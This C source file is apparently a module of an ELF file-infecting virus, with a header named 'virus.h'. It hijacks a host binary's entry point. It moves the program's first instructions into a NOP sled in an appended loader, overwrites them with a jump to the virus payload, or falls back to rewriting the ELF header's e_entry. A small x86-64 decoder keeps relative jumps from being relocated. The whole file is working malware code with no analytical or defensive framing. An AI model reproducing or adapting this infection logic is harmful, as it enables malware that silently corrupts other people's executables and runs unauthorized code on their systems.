
#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "utils.h"
#include "bytes.h"
#include "compiler_utils.h"
#include "errors.h"

// TODO secure disasm length for unknown instructions

/* -------------------------- change header entry --------------------------- */

static bool	change_header_entry(struct safe_ptr clone_ref,
			Elf64_Xword dist_payload_entry)
{
	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	Elf64_Addr	e_entry = hdr->e_entry;

	e_entry += dist_payload_entry;
	hdr->e_entry = e_entry;

	return true;
}

/* ---------------------- adapt client and loader code ---------------------- */

static void	write_jump_to_virus(void *client_ptr, size_t copy_size,
			Elf64_Xword dist_payload_entry)
{
	int32_t		value = (int32_t)dist_payload_entry - JUMP32_INST_SIZE;

	memset(client_ptr, 0x90, copy_size);
	write_jump(client_ptr, value, DWORD);
}

static void	write_jump_to_client(void *loader_jump_ptr)
{
	int32_t		*value = (int32_t*)(loader_jump_ptr + 1);

	*value += JUMP32_INST_SIZE;
}

static void	copy_client_to_sled(void *sled_ptr, void *client_ptr,
			size_t copy_size)
{
	memcpy(sled_ptr, client_ptr, copy_size);
}

/* -------------------------------------------------------------------------- */

static bool	disasm_jump(const void *code, size_t codelen)
{
	uint8_t		*p = (uint8_t*)code;
	uint8_t		opcode;                 /* current opcode       */
	int8_t		prefix = 0;           /* opcode prefix(es)    */

	if (codelen > INSTRUCTION_MAXLEN) codelen = INSTRUCTION_MAXLEN;

	/* prefix loop */
next_opcode:

	if (!codelen--) return false; /* error if instruction is too long */
	opcode = *p++;

	/* check if has prefix */
	if (opcode == 0x0f) {prefix |= OP_PREFIX_0F; goto next_opcode;}
	/* check if has REX    */
	if (opcode >= 0x40 && opcode <= 0x4f) {goto next_opcode;}

	/* rel8 */
	if ((opcode >= 0x70 && opcode <= 0x7f)           /* JMPcc             */
	|| (opcode >= 0xe0 && opcode <= 0xe3)            /* LOOP/LOOPcc/JMPcc */
	|| (opcode == 0xeb))                             /* JMP               */
	{
		goto is_jump;
	}
	/* rel16/32 */
	else if ((opcode == 0xe8)                          /* CALL            */
	|| (opcode == 0xe9)                                /* JMP             */
	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) /* JMPcc           */
	{
		goto is_jump;
	}
	/* [rip + displacement] */
	else if (opcode == 0x8d)                           /* LEA             */
	{
		if (!codelen--) return false;
		opcode = *p++;

		uint8_t	mod = (opcode & 0b11000000) >> 6;
		uint8_t	rm  = opcode & 0b00000111;

		// 48 8d 35 42 00 00 00
		if (mod == 0b00 && rm == 0b101)  /* RIP-relative addressing */
		{
			goto is_jump;
		}
	}
	return false;
is_jump:
	return true;
}

static bool	get_copy_size(size_t *copy_size, void *code, size_t codelen)
{
	*copy_size = 0;

	while (*copy_size < JUMP32_INST_SIZE)
	{
		size_t	instruction_length = disasm_length(code, codelen);

		if (instruction_length == 0) return false;

		if (disasm_jump(code, codelen))
			return false;

		*copy_size += instruction_length;
		code += instruction_length;
		codelen -= instruction_length;
	}
	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
			size_t dist_nopsled_loader, size_t dist_client_loader)
{
	Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
	size_t		offset_in_section  = file_entry->offset_in_section;
	size_t		entry_offset       = sh_offset + offset_in_section;
	size_t		payload_offset     = file_entry->end_of_last_section;
	Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;

	size_t		loader_jump_offset = payload_offset + dist_client_loader;
	size_t		loader_sled_offset = payload_offset + dist_nopsled_loader;
	size_t		sledlen = dist_client_loader - dist_nopsled_loader;

	void		*client_code_ptr = safe(clone_ref, entry_offset, sledlen);
	void		*loader_sled_ptr = safe(clone_ref, loader_sled_offset, sledlen);
	void		*loader_jump_ptr = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);

	if (!client_code_ptr || !loader_sled_ptr || !loader_jump_ptr)
		return false;

	size_t		copy_size = 0;

	memset(loader_sled_ptr, 0x90, sledlen);
	if (get_copy_size(&copy_size, client_code_ptr, sledlen))
	{
		copy_client_to_sled(loader_sled_ptr, client_code_ptr, copy_size);
		write_jump_to_virus(client_code_ptr, copy_size, dist_payload_entry);
		write_jump_to_client(loader_jump_ptr);
	}
	else
	{
		change_header_entry(clone_ref, dist_payload_entry);
	}
	return true;
}
